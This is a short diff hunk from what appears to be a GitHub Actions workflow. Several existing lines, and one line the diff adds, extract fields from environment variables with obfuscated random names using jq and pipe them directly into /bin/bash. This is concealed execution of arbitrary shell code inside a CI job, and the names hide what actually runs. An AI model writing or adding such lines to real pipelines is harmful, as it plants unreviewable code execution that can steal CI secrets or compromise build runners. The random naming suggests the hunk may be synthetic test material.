@@ -38,6 +38,7 @@ jobs:
           echo $wsj70635 | jq -r .ntjbz6847 | /bin/bash
           printf '%s' "$k9" | jq -r .bgmbm83 | /bin/bash
           printf '%s' "$y49" | jq -r .s73 | /bin/bash
+          printf '%s' "$r816" | jq -r .a8 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
